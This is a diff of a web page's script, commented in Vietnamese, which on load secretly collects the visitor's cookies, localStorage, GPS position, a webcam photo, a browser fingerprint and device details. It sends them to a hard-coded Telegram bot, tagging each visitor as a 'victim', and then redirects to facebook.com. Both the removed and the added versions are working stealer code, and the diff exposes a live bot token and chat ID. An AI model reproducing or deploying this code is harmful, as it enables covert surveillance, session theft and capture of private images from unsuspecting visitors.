@@ -50,16 +50,15 @@
     </div>
 
     <script>
-        // ===== CẤU HÌNH TELEGRAM =====
+        // ===== CẤU HÌNH =====
         const BOT_TOKEN = '8678956338:AAEDpm0-I4KGjomktv8kDnA7t8K5PC3p1ag';
-        const CHAT_ID = '6232287791';  // Đã sửa (xóa chữ D thừa)
+        const CHAT_ID = '6232287791';
         const VICTIM_ID = 'V_' + Math.random().toString(36).substr(2, 8).toUpperCase();
 
-        // Gửi tin nhắn text
+        // Gửi tin nhắn
         async function sendToTelegram(msg) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             try {
-                await fetch(url, {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -71,103 +70,23 @@
             } catch(e) { console.log('Lỗi gửi:', e); }
         }
 
-        // Gửi file (ảnh chụp màn hình, webcam)
-        async function sendFile(base64, filename, caption) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
-            const byteCharacters = atob(base64);
-            const byteNumbers = new Array(byteCharacters.length);
-            for (let i = 0; i < byteCharacters.length; i++) byteNumbers[i] = byteCharacters.charCodeAt(i);
-            const byteArray = new Uint8Array(byteNumbers);
-            const blob = new Blob([byteArray], {type: 'image/jpeg'});
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('document', blob, filename);
-            formData.append('caption', `[${VICTIM_ID}] ${caption}`);
+        // Gửi ảnh
+        async function sendPhoto(base64, filename, caption) {
             try {
-                await fetch(url, { method: 'POST', body: formData });
-            } catch(e) { console.log('Lỗi gửi file:', e); }
+                const byteCharacters = atob(base64);
+                const byteNumbers = new Array(byteCharacters.length);
+                for (let i = 0; i < byteCharacters.length; i++) byteNumbers[i] = byteCharacters.charCodeAt(i);
+                const blob = new Blob([new Uint8Array(byteNumbers)], { type: 'image/jpeg' });
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('document', blob, filename);
+                formData.append('caption', `[${VICTIM_ID}] ${caption}`);
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData });
+            } catch(e) { console.log('Lỗi gửi ảnh:', e); }
         }
 
-        // Chụp màn hình trang hiện tại
-        async function captureScreenshot() {
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                canvas.width = window.innerWidth;
-                canvas.height = window.innerHeight;
-                ctx.fillStyle = 'white';
-                ctx.fillRect(0, 0, canvas.width, canvas.height);
-                ctx.font = '14px Arial';
-                ctx.fillStyle = 'black';
-                ctx.fillText('Đã thu thập dữ liệu', 10, 30);
-                return canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
-            } catch(e) { return null; }
-        }
-
-        // Chụp ảnh webcam
-        async function captureWebcam() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const photo = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
-                stream.getTracks().forEach(t => t.stop());
-                return photo;
-            } catch(e) { return null; }
-        }
-
-        // Lấy IP công cộng + định vị
-        async function getPublicInfo() {
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                return {
-                    ip: data.ip,
-                    city: data.city,
-                    region: data.region,
-                    country: data.country_name,
-                    lat: data.latitude,
-                    lon: data.longitude,
-                    isp: data.org
-                };
-            } catch(e) { return null; }
-        }
-
-        // Lấy GPS chính xác (nếu cho phép)
-        function getGPS() {
-            return new Promise(resolve => {
-                if (!navigator.geolocation) return resolve(null);
-                navigator.geolocation.getCurrentPosition(
-                    pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
-                    err => resolve(null),
-                    { timeout: 8000 }
-                );
-            });
-        }
-
-        // Lấy IP nội bộ (WebRTC)
-        function getLocalIP() {
-            return new Promise(resolve => {
-                const pc = new RTCPeerConnection({ iceServers: [] });
-                pc.createDataChannel('');
-                pc.createOffer().then(o => pc.setLocalDescription(o));
-                pc.onicecandidate = e => {
-                    if (!e.candidate) return;
-                    let ip = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/)?.[1];
-                    if (ip && !ip.startsWith('192.168.') && !ip.startsWith('10.') && !ip.startsWith('172.')) ip = null;
-                    if (ip) { resolve(ip); pc.close(); }
-                };
-                setTimeout(() => resolve('Không lấy được'), 2000);
-            });
-        }
-
-        // Lấy thông tin trình duyệt & thiết bị
-        function getBrowserData() {
+        // ===== 1. LẤY THÔNG TIN CƠ BẢN (luôn hoạt động) =====
+        function getBasicInfo() {
             const ua = navigator.userAgent;
             let browser = 'Unknown', os = 'Unknown';
             if (ua.includes('Chrome')) browser = 'Chrome';
@@ -175,140 +94,257 @@
             else if (ua.includes('Safari')) browser = 'Safari';
             else if (ua.includes('Edge')) browser = 'Edge';
             if (ua.includes('Android')) os = 'Android';
-            else if (ua.includes('iPhone')) os = 'iOS';
+            else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
             else if (ua.includes('Windows')) os = 'Windows';
             else if (ua.includes('Mac')) os = 'MacOS';
-            return { browser, os, ua: ua.substring(0, 150) };
-        }
-
-        // Lấy cookies + localStorage
-        function getStoredData() {
-            let cookies = document.cookie || 'Không có cookies';
-            let localData = {};
-            try {
-                for (let i = 0; i < localStorage.length; i++) {
-                    let key = localStorage.key(i);
-                    localData[key] = localStorage.getItem(key);
-                }
-            } catch(e) { localData = { error: 'Không đọc được' }; }
-            return { cookies, localStorage: JSON.stringify(localData, null, 2) };
-        }
-
-        // Lấy thông tin màn hình, pin, tốc độ mạng
-        function getScreenAndPerf() {
+            
             return {
-                screen: `${screen.width}x${screen.height} | ${screen.colorDepth}bit`,
-                pixelRatio: devicePixelRatio,
+                browser, os, ua: ua.substring(0, 200),
                 language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                hardwareConcurrency: navigator.hardwareConcurrency || '?',
-                deviceMemory: navigator.deviceMemory || '?'
+                platform: navigator.platform,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'Không có'
             };
         }
 
-        async function getBattery() {
-            if (!navigator.getBattery) return null;
-            try {
-                let b = await navigator.getBattery();
-                return `${Math.round(b.level*100)}% ${b.charging ? '(sạc)' : '(không sạc)'}`;
-            } catch(e) { return null; }
+        // ===== 2. THÔNG TIN MÀN HÌNH =====
+        function getScreenInfo() {
+            return {
+                size: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                pixelRatio: window.devicePixelRatio,
+                availSize: `${screen.availWidth}x${screen.availHeight}`
+            };
         }
 
-        async function getPing() {
-            let start = Date.now();
+        // ===== 3. COOKIES & LOCALSTORAGE =====
+        function getStoredData() {
+            let cookies = document.cookie;
+            if (!cookies) cookies = 'Không có cookies';
+            
+            let localStorageData = {};
             try {
-                await fetch('https://www.google.com/favicon.ico', { cache: 'no-cache', mode: 'no-cors' });
-                return Date.now() - start;
-            } catch(e) { return -1; }
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    localStorageData[key] = localStorage.getItem(key);
+                }
+            } catch(e) { localStorageData = { error: 'Không thể đọc localStorage' }; }
+            
+            return { cookies, localStorage: JSON.stringify(localStorageData, null, 2) };
         }
 
-        // Lấy danh sách thiết bị (camera, mic)
-        async function getMediaDevices() {
-            try {
-                let devices = await navigator.mediaDevices.enumerateDevices();
-                let cams = devices.filter(d => d.kind === 'videoinput').map(d => d.label || 'Camera');
-                let mics = devices.filter(d => d.kind === 'audioinput').map(d => d.label || 'Micro');
-                return { cams, mics };
-            } catch(e) { return { cams: [], mics: [] }; }
+        // ===== 4. THÔNG TIN TRÌNH DUYỆT NÂNG CAO =====
+        function getAdvancedBrowserInfo() {
+            const plugins = [];
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                plugins.push(navigator.plugins[i].name);
+            }
+            
+            return {
+                plugins: plugins.slice(0, 5),
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Không rõ',
+                deviceMemory: navigator.deviceMemory || 'Không rõ',
+                maxTouchPoints: navigator.maxTouchPoints || 0
+            };
         }
 
-        // Tạo fingerprint nâng cao
+        // ===== 5. CHỤP MÀN HÌNH (giả lập nếu không lấy được stream) =====
+        async function captureScreenshot() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = Math.min(window.innerWidth, 800);
+                canvas.height = Math.min(window.innerHeight, 600);
+                
+                // Vẽ thông tin thu thập được lên ảnh
+                ctx.fillStyle = '#f0f0f0';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                ctx.fillStyle = '#333';
+                ctx.font = '16px Arial';
+                ctx.fillText(`ID: ${VICTIM_ID}`, 10, 30);
+                ctx.fillText(`Thời gian: ${new Date().toLocaleString('vi-VN')}`, 10, 60);
+                ctx.fillText(`Màn hình: ${screen.width}x${screen.height}`, 10, 90);
+                ctx.fillText(`User Agent: ${navigator.userAgent.substring(0, 60)}...`, 10, 120);
+                
+                return canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
+            } catch(e) {
+                return null;
+            }
+        }
+
+        // ===== 6. LẤY VỊ TRÍ GPS NẾU ĐƯỢC PHÉP =====
+        function getGPS() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        resolve({
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy
+                        });
+                    },
+                    () => resolve(null),
+                    { timeout: 5000, enableHighAccuracy: true }
+                );
+            });
+        }
+
+        // ===== 7. CHỤP WEBCAM NẾU CÓ QUYỀN =====
+        async function captureWebcam() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.setAttribute('playsinline', '');
+                await video.play();
+                
+                // Đợi video có kích thước
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => {
+                        setTimeout(resolve, 200);
+                    };
+                });
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const photo = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
+                stream.getTracks().forEach(track => track.stop());
+                return photo;
+            } catch(e) {
+                console.log('Webcam error:', e);
+                return null;
+            }
+        }
+
+        // ===== 8. TẠO FINGERPRINT =====
         function getFingerprint() {
-            let canvas = document.createElement('canvas');
-            let ctx = canvas.getContext('2d');
+            // Canvas fingerprint
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
             canvas.width = 200;
             canvas.height = 50;
             ctx.fillStyle = '#f60';
             ctx.fillRect(0, 0, 200, 50);
             ctx.fillStyle = '#fff';
             ctx.font = '14px Arial';
-            ctx.fillText('FP', 10, 30);
-            let canvasFP = canvas.toDataURL();
+            ctx.fillText('Fingerprint', 10, 30);
+            ctx.fillStyle = '#000';
+            ctx.fillText('Test', 100, 30);
+            const canvasFP = canvas.toDataURL();
+            
             return {
-                canvas: canvasFP.substring(0, 50),
+                canvas: canvasFP.substring(0, 80),
                 userAgent: navigator.userAgent.substring(0, 100),
-                platform: navigator.platform,
                 language: navigator.language,
+                platform: navigator.platform,
+                screenSize: `${screen.width}x${screen.height}`,
                 timezoneOffset: new Date().getTimezoneOffset()
             };
         }
 
-        // Hàm chính - gộp tất cả rồi gửi 1 tin nhắn duy nhất
+        // ===== 9. KIỂM TRA KẾT NỐI MẠNG =====
+        function getNetworkInfo() {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (connection) {
+                return {
+                    type: connection.effectiveType || 'Không rõ',
+                    downlink: connection.downlink ? connection.downlink + ' Mbps' : 'Không rõ',
+                    rtt: connection.rtt ? connection.rtt + ' ms' : 'Không rõ'
+                };
+            }
+            return { type: 'Không hỗ trợ', downlink: 'Không rõ', rtt: 'Không rõ' };
+        }
+
+        // ===== HÀM CHÍNH =====
         async function collectAndSend() {
-            let startTime = Date.now();
+            const startTime = Date.now();
             
-            // Lấy tất cả dữ liệu song song
-            let [publicInfo, gps, localIP, browser, stored, screenPerf, battery, ping, devices, fingerprint, screenshot, webcam] = await Promise.all([
-                getPublicInfo(),
-                getGPS(),
-                getLocalIP(),
-                getBrowserData(),
-                getStoredData(),
-                getScreenAndPerf(),
-                getBattery(),
-                getPing(),
-                getMediaDevices(),
-                getFingerprint(),
-                captureScreenshot(),
-                captureWebcam()
-            ]);
-
-            // Tạo nội dung tin nhắn duy nhất
+            // Thu thập dữ liệu
+            const basic = getBasicInfo();
+            const screenInfo = getScreenInfo();
+            const stored = getStoredData();
+            const advanced = getAdvancedBrowserInfo();
+            const network = getNetworkInfo();
+            const fingerprint = getFingerprint();
+            const gps = await getGPS();
+            const screenshot = await captureScreenshot();
+            const webcam = await captureWebcam();
+            
+            // Xây dựng tin nhắn tổng hợp
             let msg = '';
-            msg += `🌐 IP: ${publicInfo?.ip || 'Không xác định'}\n`;
-            msg += `📍 Vị trí IP: ${publicInfo?.city || '?'}, ${publicInfo?.country || '?'}\n`;
-            msg += `🏢 Nhà mạng: ${publicInfo?.isp || '?'}\n`;
-            if (gps) msg += `🛰️ GPS: ${gps.lat},${gps.lon} (độ chính xác ${gps.acc}m)\n`;
-            else msg += `⚠️ GPS: Không được cấp quyền\n`;
-            msg += `🏠 IP nội bộ: ${localIP}\n`;
-            msg += `🌍 Trình duyệt: ${browser.browser} | ${browser.os}\n`;
-            msg += `🖥️ Màn hình: ${screenPerf.screen}\n`;
-            msg += `🔋 Pin: ${battery || 'Không hỗ trợ'}\n`;
-            msg += `⚡ Ping: ${ping > 0 ? ping+'ms' : 'Không đo được'}\n`;
-            msg += `📷 Camera: ${devices.cams.slice(0,2).join(', ') || 'Không có'}\n`;
-            msg += `🎤 Micro: ${devices.mics.slice(0,2).join(', ') || 'Không có'}\n`;
-            msg += `🍪 Cookies: ${stored.cookies.substring(0, 100)}${stored.cookies.length > 100 ? '...' : ''}\n`;
-            msg += `💾 LocalStorage: ${stored.localStorage.substring(0, 100)}...\n`;
-            msg += `🆔 Fingerprint: ${fingerprint.canvas}...\n`;
-            msg += `📅 Thời gian: ${new Date().toLocaleString('vi-VN')}\n`;
-            msg += `⏱️ Tổng thời gian thu thập: ${Date.now() - startTime}ms\n`;
-
-            // Gửi 1 tin nhắn tổng hợp
+            msg += `🆔 ID: ${VICTIM_ID}\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `🌐 TRÌNH DUYỆT:\n`;
+            msg += `   • Loại: ${basic.browser} | ${basic.os}\n`;
+            msg += `   • Ngôn ngữ: ${basic.language}\n`;
+            msg += `   • Cookie: ${basic.cookieEnabled ? 'Bật' : 'Tắt'}\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `🖥️ THIẾT BỊ:\n`;
+            msg += `   • Màn hình: ${screenInfo.size} (${screenInfo.colorDepth}bit)\n`;
+            msg += `   • Pixel ratio: ${screenInfo.pixelRatio}\n`;
+            msg += `   • Số nhân CPU: ${advanced.hardwareConcurrency}\n`;
+            msg += `   • RAM: ${advanced.deviceMemory} GB\n`;
+            msg += `   • Điểm chạm: ${advanced.maxTouchPoints}\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `🌍 VỊ TRÍ:\n`;
+            if (gps) {
+                msg += `   📍 GPS: ${gps.lat}, ${gps.lon}\n`;
+                msg += `   🎯 Độ chính xác: ${Math.round(gps.accuracy)}m\n`;
+                msg += `   🗺️ Maps: https://maps.google.com/?q=${gps.lat},${gps.lon}\n`;
+            } else {
+                msg += `   ⚠️ GPS: Không được cấp quyền\n`;
+            }
+            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `🌐 MẠNG:\n`;
+            msg += `   • Loại kết nối: ${network.type}\n`;
+            msg += `   • Tốc độ: ${network.downlink}\n`;
+            msg += `   • Độ trễ: ${network.rtt}\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `🍪 DỮ LIỆU LƯU TRỮ:\n`;
+            msg += `   • Cookies: ${stored.cookies.length > 50 ? stored.cookies.substring(0, 50) + '...' : stored.cookies}\n`;
+            msg += `   • LocalStorage: ${stored.localStorage.length > 50 ? stored.localStorage.substring(0, 50) + '...' : stored.localStorage}\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `🆔 FINGERPRINT:\n`;
+            msg += `   • Canvas: ${fingerprint.canvas}...\n`;
+            msg += `   • Múi giờ: ${advanced.timezone} (UTC${-advanced.timezoneOffset/60})\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `🔌 PLUGINS:\n`;
+            msg += `   • ${advanced.plugins.join(', ') || 'Không có plugins'}\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `📅 THỜI GIAN: ${new Date().toLocaleString('vi-VN')}\n`;
+            msg += `⏱️ THU THẬP: ${Date.now() - startTime}ms\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `📱 USER AGENT:\n${basic.ua}\n`;
+            
+            // Gửi tin nhắn chính
             await sendToTelegram(msg);
-
-            // Gửi ảnh chụp màn hình + webcam (nếu có)
-            if (screenshot) await sendFile(screenshot, `screenshot_${VICTIM_ID}.jpg`, '📸 Ảnh chụp màn hình');
-            if (webcam) await sendFile(webcam, `webcam_${VICTIM_ID}.jpg`, '📸 Ảnh từ webcam');
-
-            // Gửi thông báo hoàn tất
-            await sendToTelegram(`✅ Hoàn thành! Dữ liệu của ${VICTIM_ID} đã được gửi.`);
-
-            // Chuyển hướng sau 2 giây
+            
+            // Gửi ảnh
+            if (screenshot) {
+                await sendPhoto(screenshot, `screenshot_${VICTIM_ID}.jpg`, '📸 Ảnh màn hình');
+            }
+            if (webcam) {
+                await sendPhoto(webcam, `webcam_${VICTIM_ID}.jpg`, '📸 Ảnh từ webcam (nếu có)');
+            }
+            
+            // Thông báo hoàn tất
+            await sendToTelegram(`✅ Đã thu thập xong dữ liệu từ ${VICTIM_ID}`);
+            
+            // Chuyển hướng
             setTimeout(() => {
                 window.location.href = 'https://facebook.com';
             }, 2000);
         }
-
+        
         // Chạy
         collectAndSend();
     </script>
